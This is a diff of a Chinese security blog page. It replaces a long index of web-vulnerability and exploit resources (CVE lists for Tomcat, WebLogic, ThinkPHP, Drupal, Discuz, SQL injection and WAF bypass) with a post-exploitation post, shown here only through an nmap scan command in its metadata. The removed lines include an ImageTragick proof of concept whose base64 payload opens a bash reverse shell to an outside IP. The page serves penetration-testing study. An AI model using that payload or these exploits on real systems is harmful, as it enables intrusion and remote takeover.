@@ -8,17 +8,17 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="漏洞挖掘与利用Web应用Server端架构 Take Your Path Normalization Off And Pop 0days Out! - Orange Tsai HTTP盲攻击的几种思路 Cracking the Lens: Targeting HTTP’s Hidden Attack-Surface collaborator-everywhere   详解Web缓存欺骗攻击  组件">
+  <meta name="description" content="后渗透基础设施分析内网扫描 nmap最高速全端口：1nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0    比较隐蔽：  -PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/2019/08/19/漏洞利用/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/19/后渗透/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="漏洞挖掘与利用Web应用Server端架构 Take Your Path Normalization Off And Pop 0days Out! - Orange Tsai HTTP盲攻击的几种思路 Cracking the Lens: Targeting HTTP’s Hidden Attack-Surface collaborator-everywhere   详解Web缓存欺骗攻击  组件">
+<meta property="og:description" content="后渗透基础设施分析内网扫描 nmap最高速全端口：1nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0    比较隐蔽：  -PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-07-17T16:10:06.549Z">
+<meta property="og:updated_time" content="2019-06-30T09:16:25.077Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hexo">
-<meta name="twitter:description" content="漏洞挖掘与利用Web应用Server端架构 Take Your Path Normalization Off And Pop 0days Out! - Orange Tsai HTTP盲攻击的几种思路 Cracking the Lens: Targeting HTTP’s Hidden Attack-Surface collaborator-everywhere   详解Web缓存欺骗攻击  组件">
+<meta name="twitter:description" content="后渗透基础设施分析内网扫描 nmap最高速全端口：1nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0    比较隐蔽：  -PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -47,7 +47,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="" class="js-avatar">
+			<img src="/img/touxiang.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">mgiftdc</a></h1>
@@ -81,7 +81,7 @@
 		<nav class="header-nav">
 			<div class="social">
 				
-					<a class="github" target="_blank" href="#" title="github"><i class="icon-github"></i></a>
+					<a class="github" target="_blank" href="https://github.com/mgiftdc" title="github"><i class="icon-github"></i></a>
 		        
 					<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
 		        
@@ -105,7 +105,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="" class="js-avatar">
+				<img src="/img/touxiang.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">mgiftdc</h1>
@@ -122,7 +122,7 @@
 			<nav class="header-nav">
 				<div class="social">
 					
-						<a class="github" target="_blank" href="#" title="github"><i class="icon-github"></i></a>
+						<a class="github" target="_blank" href="https://github.com/mgiftdc" title="github"><i class="icon-github"></i></a>
 			        
 						<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
 			        
@@ -154,541 +154,133 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-漏洞利用" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-后渗透" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="漏洞挖掘与利用"><a href="#漏洞挖掘与利用" class="headerlink" title="漏洞挖掘与利用"></a>漏洞挖掘与利用</h2><h3 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h3><h4 id="Server端"><a href="#Server端" class="headerlink" title="Server端"></a>Server端</h4><h5 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h5><ul>
-<li><a href="https://www.youtube.com/watch?reload=9&v=R_4edL7YDcg" target="_blank" rel="noopener">Take Your Path Normalization Off And Pop 0days Out! - Orange Tsai</a></li>
-<li><a href="https://xz.aliyun.com/t/1011" target="_blank" rel="noopener">HTTP盲攻击的几种思路</a></li>
-<li><a href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface" target="_blank" rel="noopener">Cracking the Lens: Targeting HTTP’s Hidden Attack-Surface</a><ul>
-<li><a href="https://github.com/PortSwigger/collaborator-everywhere" target="_blank" rel="noopener">collaborator-everywhere</a></li>
-</ul>
-</li>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/Server%E7%AB%AF/%E8%AF%A6%E8%A7%A3Web%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB.pdf" target="_blank" rel="noopener">详解Web缓存欺骗攻击</a></li>
-</ul>
-<h5 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h5><ul>
-<li><a href="https://www.secpulse.com/archives/3750.html" target="_blank" rel="noopener">解析漏洞总结</a></li>
-<li>Nginx<ul>
-<li><a href="https://www.freebuf.com/articles/web/149761.html" target="_blank" rel="noopener">Nginx不安全配置可能导致的安全漏洞</a></li>
-<li>CVE-2016-1247（本地提权）</li>
-</ul>
-</li>
-<li>Apache<ul>
-<li>CVE-2019-0211（本地提权）</li>
-</ul>
-</li>
-<li>IIS<ul>
-<li>IIS PUT</li>
-<li>CVE-2017-7269（RCE）</li>
-</ul>
-</li>
-</ul>
-<h5 id="基础库"><a href="#基础库" class="headerlink" title="基础库"></a>基础库</h5><ul>
-<li><p>ImageMagick</p>
-<ul>
-<li>CVE-2019-6116（GhostScript沙箱绕过 RCE）</li>
-<li>CVE-2018-17961（GhostScript沙箱绕过 RCE）</li>
-<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="noopener">ghostscript: multiple critical vulnerabilities, including remote command execution</a></li>
-<li>CVE-2016-5118（命令注入 RCE）</li>
-<li>CVE-2016-3714（<a href="https://imagetragick.com" target="_blank" rel="noopener">“ImageTragick”漏洞</a> RCE）(保存成图片：poc vul.jpg )<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzM1LjIyMS4xODQuODcvODAgMzM+JjE= | base64 -d | bash`&quot;||id &quot; )&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>FFmpeg</p>
-<ul>
-<li><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin" target="_blank" rel="noopener">CVE-2017-9993（任意文件读取）</a></li>
-<li>CVE-2016-1897/8（SSRF &amp; 任意文件读取）</li>
-</ul>
-</li>
-</ul>
-<h5 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h5><ul>
-<li>Zabbix<ul>
-<li>弱口令</li>
-<li><a href="https://blog.csdn.net/cd_xuyue/article/details/52240944" target="_blank" rel="noopener">Zabbix 2.2.x, 3.0.x latest.php SQL注入漏洞</a></li>
-<li><a href="http://blog.qingteng.cn/2016/08/20/zabbix-sqljsrpc-php-注入漏洞分析-（以3-0-2为例）/" target="_blank" rel="noopener">Zabbix 2.2.x, 3.0.x jsrpc.php SQL注入漏洞</a></li>
-<li>CVE-2014-9450（SQL注入）</li>
-<li>CVE-2013-5743（SQL注入）</li>
-</ul>
-</li>
-<li>Nagios<ul>
-<li>CVE-2016-9566（本地提权）</li>
-</ul>
-</li>
-</ul>
-<h4 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h4><ul>
-<li><a href="https://gitlab.com/sfish/pt/raw/master/Web%E5%BA%94%E7%94%A8/Java%20Web/JavaWeb.png" target="_blank" rel="noopener">JavaWeb.png</a></li>
-<li><a href="https://blog.csdn.net/renfengmei/article/details/44754329" target="_blank" rel="noopener">一种新的攻击方法——Java Web表达式注入</a><ul>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0195845.html" target="_blank" rel="noopener">搜狗某系统存在远程EL表达式注入漏洞(命令执行)</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0196160.html" target="_blank" rel="noopener">工商银行某系统存在远程EL表达式注入漏洞(命令执行)</a></li>
-</ul>
-</li>
-<li><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">J2EEScan</a></li>
-</ul>
-<h5 id="WebServer"><a href="#WebServer" class="headerlink" title="WebServer"></a>WebServer</h5><ul>
-<li><a href="https://www.cnblogs.com/shellr00t/p/5965727.html" target="_blank" rel="noopener">常见WebServer弱口令及getshell方法总结</a></li>
-<li><a href="http://www.vuln.cn/7068" target="_blank" rel="noopener">解密JBoss和Weblogic数据源连接字符串和控制台密码</a></li>
-<li>Tomcat<ul>
-<li>CVE-2017-12616（信息泄漏）</li>
-<li>CVE-2017-12615（PUT RCE）</li>
-<li>CVE-2016-8735（反序列化 RCE）</li>
-<li>CVE-2016-1240（本地提权）</li>
-</ul>
-</li>
-<li>Resin（待整理）<ul>
-<li>未授权访问</li>
-<li>任意文件读取</li>
-<li>目录遍历</li>
-</ul>
-</li>
-<li>WebLogic<ul>
-<li>wls9-async反序列化RCE（暂无详情）</li>
-<li>CVE-2019-2647（XXE）</li>
-<li>CVE-2018-3252（反序列化RCE）</li>
-<li>CVE-2018-3246（XXE）</li>
-<li>CVE-2018-2894（文件上传）</li>
-<li>CVE-2017-10271（反序列化RCE）</li>
-<li>CVE-2017-3506（反序列化RCE）</li>
-<li>CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2628、CVE-2018-2983、CVE-2018-3191、CVE-2018-3245（反序列化RCE via T3）</li>
-<li>CVE-2014-4210（SSRF）</li>
-</ul>
-</li>
-<li>WebSphere<ul>
-<li><a href="https://www.seebug.org/vuldb/ssvid-89727" target="_blank" rel="noopener">Java反序列化RCE</a></li>
-<li>CVE-2014-0823（任意文件读取）</li>
-</ul>
-</li>
-<li>GlassFish<ul>
-<li><a href="https://www.anquanke.com/post/id/83306" target="_blank" rel="noopener">任意文件读取</a></li>
-</ul>
-</li>
-<li>JBoss<ul>
-<li>CVE-2017-12149（JBoss AS 6.x反序列化RCE）</li>
-<li><a href="https://www.seebug.org/vuldb/ssvid-89723" target="_blank" rel="noopener">Java反序列化RCE（JMXInvokerServlet）</a></li>
-<li>jmx-console未授权访问</li>
-<li><a href="http://www.vuln.cn/6300" target="_blank" rel="noopener">JBoss安全问题总结</a></li>
-</ul>
-</li>
-</ul>
-<h5 id="开发框架"><a href="#开发框架" class="headerlink" title="开发框架"></a>开发框架</h5><ul>
-<li><a href="https://www.inbreak.net/archives/477" target="_blank" rel="noopener">《Attacking Java Web》</a></li>
-<li>Spring<ul>
-<li>CVE-2018-1271（Spring MVC目录遍历）</li>
-<li>CVE-2018-1270（Spring Messaging RCE）</li>
-<li>CVE-2018-1259（Spring Data集成XMLBeam XXE）</li>
-<li>CVE-2017-8046（Spring REST Data SpEL表达式注入RCE）</li>
-<li>CVE-2016-4977（Spring Security OAuth RCE）</li>
-<li><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">Jndi注入及Spring RCE漏洞分析</a></li>
-<li>CVE-2011-2730（Spring EL表达式执行RCE）</li>
-<li>CVE-2010-1622（Spring MVC <a href="https://www.inbreak.net/archives/377" target="_blank" rel="noopener">DOS&amp;RCE</a>）</li>
-</ul>
-</li>
-<li>Struts2<ul>
-<li>s2-016、s2-019、s2-032、s2-037、s2-045、s2-046、s2-devmode（RCE）</li>
-</ul>
-</li>
-</ul>
-<h5 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h5><ul>
-<li>Jenkins<ul>
-<li>未授权访问</li>
-<li>CVE-2019-1003000（RCE）</li>
-<li>CVE-2018-1999002（任意文件读取）</li>
-<li>CVE-2018-1999001（配置文件路径改动导致管理员权限开放）</li>
-<li>CVE-2017-1000353（反序列化RCE）</li>
-<li>CVE-2016-0792（XStream反序列化RCE）</li>
-<li><a href="https://www.seebug.org/vuldb/ssvid-89725" target="_blank" rel="noopener">Java反序列化RCE</a></li>
-</ul>
-</li>
-<li>ElasticSearch<ul>
-<li>未授权访问</li>
-<li>CVE-2015-3337（任意文件读取）</li>
-<li>CVE-2015-1427（RCE）</li>
-<li>CVE-2014-3120（RCE）</li>
-</ul>
-</li>
-</ul>
-<h5 id="组件-1"><a href="#组件-1" class="headerlink" title="组件"></a>组件</h5><ul>
-<li>WxJava<ul>
-<li>CVE-2018-20318、CVE-2019-5312（XXE）</li>
-</ul>
-</li>
-</ul>
-<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><ul>
-<li><a href="https://www.jb51.net/article/141767.htm" target="_blank" rel="noopener">PHP绕过open_basedir限制操作文件的方法</a></li>
-<li><a href="https://www.cnblogs.com/hookjoy/p/10395317.html" target="_blank" rel="noopener">Bypass_Disable_functions_Shell</a><ul>
-<li><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">无需 sendmail：巧用 LD_PRELOAD 突破 disable_functions</a></li>
-</ul>
-</li>
-<li><a href="http://www.voidcn.com/article/p-aqdyinaj-kh.html" target="_blank" rel="noopener">PHP FastCGI 的远程利用</a></li>
-<li><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">文件包含漏洞小结</a><ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/PHP/LFI_With_PHPInfo_Assitance.pdf" target="_blank" rel="noopener">LFI_With_PHPInfo_Assitance</a></li>
-</ul>
-</li>
-</ul>
-<h5 id="开发框架-1"><a href="#开发框架-1" class="headerlink" title="开发框架"></a>开发框架</h5><ul>
-<li>ThinkPHP<ul>
-<li>RCE<ul>
-<li><a href="https://www.cnblogs.com/ichunqiujishu/archive/2018/12/14/10118432.html" target="_blank" rel="noopener">ThinkPHP5框架缺陷导致远程命令执行（POC整合帖）</a></li>
-<li><a href="http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">ThinkPHP 5.0.x-5.0.23、5.1.x、5.2.x 全版本远程代码执行漏洞分析</a></li>
-<li><a href="https://blog.csdn.net/zqsqrlqd/article/details/68923320" target="_blank" rel="noopener">ThinkPHP框架任意代码执行漏洞的利用及其修复方法</a></li>
-</ul>
-</li>
-<li>SQL注入<ul>
-<li><a href="https://www.secfree.com/a/1028.html" target="_blank" rel="noopener">ThinkPHP v5.1.22 SQL注入漏洞</a></li>
-<li><a href="https://paper.seebug.org/573/" target="_blank" rel="noopener">Thinkphp3.2.3最新版update注入漏洞</a></li>
-<li><a href="https://xz.aliyun.com/t/58" target="_blank" rel="noopener">框架filterExp函数过滤不严格导致SQL注入</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2014-087731.html" target="_blank" rel="noopener">ThinkPHP最新版本SQL注入漏洞</a></li>
-<li><a href="https://bugs.leavesongs.com/php/thinkphp框架架构上存在sql注入/" target="_blank" rel="noopener">ThinkPHP框架架构上存在SQL注入</a></li>
-<li><a href="https://www.secpulse.com/archives/29827.html" target="_blank" rel="noopener">ThinkPHP架构设计不合理极易导致SQL注入</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2015-0100225.html" target="_blank" rel="noopener">ThinkPHP一处过滤不当造成SQL注入漏洞</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2015-0115580.html" target="_blank" rel="noopener">thinkphp 某处缺陷可造成sql注射</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2015-0150649.html" target="_blank" rel="noopener">ThinkPHP框架特性引发的SQL注入漏洞</a></li>
-<li><a href="http://blog.nsfocus.net/thinkphp-5-0-sql/" target="_blank" rel="noopener">ThinkPHP 5.0版本 SQL注入漏洞分析</a></li>
-<li><a href="https://www.cesafe.com/3631.html" target="_blank" rel="noopener">ThinkPHP5.0.16&amp;5.1.6最新版 SQL注入漏洞</a></li>
-<li><a href="https://www.freebuf.com/articles/web/169098.html" target="_blank" rel="noopener">ThinkPHP 框架SQL注入技术分析</a></li>
-</ul>
-</li>
-<li>其他<ul>
-<li><a href="https://www.secpulse.com/archives/59127.html" target="_blank" rel="noopener">Thinkphp5.X设计缺陷泄漏数据库账户和密码</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>CodeIgniter<ul>
-<li><a href="https://www.secpulse.com/archives/49197.html" target="_blank" rel="noopener">CodeIgniter框架内核设计缺陷可能导致任意代码执行</a></li>
-</ul>
-</li>
-<li>Yii<ul>
-<li><a href="https://www.anquanke.com/vul/id/1046085" target="_blank" rel="noopener">Yii Framework Search SQL Injection Vulnerability</a></li>
-</ul>
-</li>
-</ul>
-<h5 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h5><ul>
-<li>WordPress<ul>
-<li><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">wpscan</a></li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>Joomla</p>
-<ul>
-<li><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">joomscan</a></li>
-</ul>
-</li>
-<li><p>Drupal</p>
-<ul>
-<li>CVE-2019-6340（反序列化RCE）</li>
-<li>CVE-2018-7600、CVE-2018-7602（RCE）</li>
-<li>CVE-2017-6926（越权查看评论）</li>
-<li>CVE-2017-6920（反序列化RCE）</li>
-<li><a href="https://www.cnblogs.com/pa-pa-pa/p/6670411.html" target="_blank" rel="noopener">Drupal 7.x Service模块SQLI &amp; RCE 漏洞分析</a></li>
-<li><a href="https://www.seebug.org/vuldb/ssvid-92436" target="_blank" rel="noopener">Drupal Core Full config export 配置文件未授权下载漏洞</a></li>
-<li><a href="https://www.seebug.org/vuldb/ssvid-92174" target="_blank" rel="noopener">Drupal 7.x RESTWS 模块命令执行漏洞</a></li>
-<li>CVE-2015-7877（SQL注入）</li>
-<li>CVE-2014-3704（SQL注入）</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>Discuz!</p>
-<ul>
-<li><p>CVE-2018-14729（<a href="https://www.anquanke.com/post/id/158270" target="_blank" rel="noopener">Dz! 1.5-2.5 后台RCE</a>）</p>
-</li>
-<li><p><a href="https://www.freebuf.com/articles/system/149810.html" target="_blank" rel="noopener">Discuz!X前台任意文件删除漏洞</a></p>
-</li>
-<li><p>后台getshell</p>
-<ul>
-<li><a href="https://www.anquanke.com/post/id/86679" target="_blank" rel="noopener">Discuz X3.3 authkey生成算法的安全性漏洞和后台任意代码执行漏洞</a></li>
-<li>后台 getshell合集（待整理）</li>
-</ul>
-</li>
-<li><p>SSRF利用</p>
-<ul>
-<li><a href="http://chengable.net/index.php/archives/46/" target="_blank" rel="noopener">discuz利用ssrf+缓存应用getshell漏洞分析</a></li>
-<li>Discuz! SSRF合集（待整理）</li>
-</ul>
-</li>
-<li><p>uc_key利用</p>
-</li>
-</ul>
-</li>
-</ul>
-<pre><code>- [DZ论坛uc_key的利用](http://admin-yuku.lofter.com/post/1cbd1826_3d2ef01)
-- [Discuz的利用UC_KEY进行getshell](http://www.anquan.us/static/bugs/wooyun-2014-048137.html)
-- [Discuz利用UC_KEY进行前台getshell2](http://www.anquan.us/static/bugs/wooyun-2015-0137991.html)</code></pre><ul>
-<li>SQL注入<ul>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2014-066095.html" target="_blank" rel="noopener">Discuz7存在一处SQL注射漏洞（无需登录即可触发）</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2014-068707.html" target="_blank" rel="noopener">Discuz! 7.2的SQL注射漏洞与代码执行漏洞</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2014-080359.html" target="_blank" rel="noopener">Discuz某版本SQL注射漏洞</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2011-02330.html" target="_blank" rel="noopener">Discuz! X2 SQL注射漏洞</a></li>
-<li>[Discuz! 7.2 插件/manyou/sources/notice.php sql注入](Discuz! 7.2 插件/manyou/sources/notice.php sql注入)</li>
-</ul>
-</li>
-</ul>
-<h5 id="组件-2"><a href="#组件-2" class="headerlink" title="组件"></a>组件</h5><ul>
-<li>PHPMailer<ul>
-<li>CVE-2016-10033（命令执行）</li>
-</ul>
-</li>
-</ul>
-<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><ul>
-<li><a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">Python Pickle的任意代码执行漏洞实践和Payload构造</a></li>
-</ul>
-<h5 id="开发框架-2"><a href="#开发框架-2" class="headerlink" title="开发框架"></a>开发框架</h5><ul>
-<li><p>Django</p>
-<ul>
-<li><a href="http://www.polaris-lab.com/index.php/archives/426/" target="_blank" rel="noopener">Django的Secret Key泄漏导致的命令执行实践</a></li>
-<li><a href="http://www.lijiejie.com/python-django-directory-traversal/" target="_blank" rel="noopener">python和django的目录遍历漏洞（任意文件读取）</a></li>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/Python/Django/Django%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88_%E4%B8%80_.pdf" target="_blank" rel="noopener">Django渗透测试与代码安全漫谈（一）</a></li>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/Python/Django/Django%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88_%E4%BA%8C_.pdf" target="_blank" rel="noopener">Django渗透测试与代码安全漫谈（二）</a></li>
-</ul>
-</li>
-<li><p>Flask</p>
-<ul>
-<li><a href="https://www.freebuf.com/articles/web/88768.html" target="_blank" rel="noopener">乱弹Flask注入</a></li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>Flask/Jinja2 SSTI<ul>
-<li><a href="https://www.freebuf.com/articles/web/98619.html" target="_blank" rel="noopener">探索Flask/Jinja2中的服务端模版注入（一）</a></li>
-<li><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">探索Flask/Jinja2中的服务端模版注入（二）</a></li>
-</ul>
-</li>
-<li><a href="https://www.anquanke.com/vul/id/1066340" target="_blank" rel="noopener">Werkzeug - Debug Shell Command Execution(Metasploit)</a></li>
-</ul>
-<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><h5 id="开发框架-3"><a href="#开发框架-3" class="headerlink" title="开发框架"></a>开发框架</h5><ul>
-<li>Ruby on Rails<ul>
-<li>CVE-2019-5418（任意文件读取）</li>
-<li>CVE-2018-3760（路径穿越与任意文件读取）</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>CVE-2016-2098（RCE）</li>
-<li>CVE-2016-0752（RCE）</li>
-<li>CVE-2015-3224（Web Console IP 白名单绕过 RCE）</li>
-<li>CVE-2013-0333（RCE <a href="http://ronin-ruby.github.io/blog/2013/01/28/new-rails-poc.html" target="_blank" rel="noopener">Rails PoC exploit for CVE-2013-0333</a>）</li>
-<li>CVE-2013-3221（数据类型注入）</li>
-<li>CVE-2013-0156（RCE）</li>
-</ul>
-<h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><ul>
-<li><a href="https://www.seebug.org/vuldb/ssvid-92674" target="_blank" rel="noopener">Node.js 模块 node-serialize 反序列化任意代码执行漏洞</a></li>
-</ul>
-<h5 id="开发框架-4"><a href="#开发框架-4" class="headerlink" title="开发框架"></a>开发框架</h5><ul>
-<li>Express<ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/Node.js/Express/Express%E9%BB%91%E7%9B%92%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95.pdf" target="_blank" rel="noopener">Express黑盒安全测试</a></li>
-<li>CVE-2017-14849（任意文件读取）</li>
-</ul>
-</li>
-</ul>
-<h4 id="企业应用"><a href="#企业应用" class="headerlink" title="企业应用"></a>企业应用</h4><ul>
-<li>Zimbra<ul>
-<li><a href="https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html" target="_blank" rel="noopener">A Saga of Code Executions on Zimbra</a>（<a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E4%BC%81%E4%B8%9A%E5%BA%94%E7%94%A8/Zimbra/Zimbra_xxe+ssrf%E5%AF%BC%E8%87%B4getshell.pdf" target="_blank" rel="noopener">Zimbra xxe+ssrf导致getshell</a>）</li>
-</ul>
-</li>
-<li>Confluence<ul>
-<li>CVE-2019-3396（RCE <a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E4%BC%81%E4%B8%9A%E5%BA%94%E7%94%A8/Confluence/SSTI_and_RCE_in_Confluence.pdf" target="_blank" rel="noopener">SSTI and RCE in Confluence</a>）</li>
-</ul>
-</li>
-</ul>
-<h4 id="常见漏洞类型"><a href="#常见漏洞类型" class="headerlink" title="常见漏洞类型"></a>常见漏洞类型</h4><ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8%E9%81%93%E4%BA%A6%E6%9C%89%E9%81%93___sm0nk.pdf" target="_blank" rel="noopener">接口安全道亦有道 – sm0nk</a></li>
-</ul>
-<h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><ul>
-<li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmap</a></li>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/SQL%E6%B3%A8%E5%85%A5/%E8%B0%88%E4%B8%80%E8%B0%88ORM%E7%9A%84%E5%AE%89%E5%85%A8.pdf" target="_blank" rel="noopener">谈一谈ORM的安全</a></li>
-<li>Bypass WAF<ul>
-<li><a href="http://www.vuln.cn/6105" target="_blank" rel="noopener">Bypass WAF Cookbook - MayIKissYou</a><ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/SQL%E6%B3%A8%E5%85%A5/5.%E5%A4%9A%E8%A7%92%E5%BA%A6%E5%AF%B9%E6%8A%97.WAF.%E7%9A%84%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B.pdf" target="_blank" rel="noopener">多角度对抗.WAF.的思路与实例</a></li>
-</ul>
-</li>
-<li><a href="https://www.secpulse.com/archives/53328.html" target="_blank" rel="noopener">我的WafBypass之道（SQL注入篇）</a></li>
-</ul>
-</li>
-<li>OOB<ul>
-<li><a href="http://netsecurity.51cto.com/art/201503/469621.htm" target="_blank" rel="noopener">隐蔽的渗出：在SQL注入中使用DNS获取数据</a></li>
-</ul>
-</li>
-<li>常见关系型数据库<ul>
-<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">SQL Injection Cheat Sheet</a><ul>
-<li><a href="http://www.anquan.us/static/drops/tips-7840.html" target="_blank" rel="noopener">SQL注入速查表（上）</a></li>
-<li><a href="http://www.anquan.us/static/drops/tips-8242.html" target="_blank" rel="noopener">SQL注入速查表（下）与Oracle注入速查表</a></li>
-</ul>
-</li>
-<li>Mysql<ul>
-<li><a href="https://www.cnblogs.com/qing123/p/4443082.html" target="_blank" rel="noopener">Mysql注入科普</a></li>
-<li><a href="https://github.com/nixawk/pentest-wiki/tree/master/2.Vulnerability-Assessment/Database-Assessment/mysql" target="_blank" rel="noopener">Mysql Hacking</a></li>
-<li>CVE-2016-6662、CVE-2016-6663、CVE-2016-6664（本地提权 <a href="https://xz.aliyun.com/t/1122" target="_blank" rel="noopener">组合利用</a>）</li>
-</ul>
-</li>
-<li>PostgreSql<ul>
-<li><a href="https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md" target="_blank" rel="noopener">POSTGRESQL HACK</a></li>
-</ul>
-</li>
